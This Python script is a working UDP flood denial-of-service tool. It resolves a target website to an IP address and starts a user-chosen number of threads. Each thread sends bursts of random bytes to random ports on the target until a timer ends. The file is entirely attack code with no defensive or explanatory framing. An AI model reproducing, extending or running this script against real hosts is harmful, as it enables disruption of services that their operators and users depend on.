import socket
import threading
import time
import random
import sys

try:
    website_url, Timer, Threads = str(sys.argv[1]), float(sys.argv[2]), int(sys.argv[3])
except IndexError:
    print(" Target Timer Threads")


def get_ip_address(url):
    try:
        ip_address = socket.gethostbyname(url)
        print(ip_address)
        return ip_address
    except socket.error as e:
        print(f"Error: {e}")
        return None

Target = str(get_ip_address(website_url))

Timeout = time.time() + 1 * Timer

def attack():
    try:
       number = 0
       Bytes = random._urandom(512)
       sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
       while time.time() < Timeout:
           dport = random.randint(22,55500)
           sock.sendto(Bytes*random.randint(5,22), (Target, dport))
           number += 1
       print(number) 
       return
    except Exception as Error:
        print(Error)       

for i in range(0, Threads):
    threading.Thread(target=attack).start()


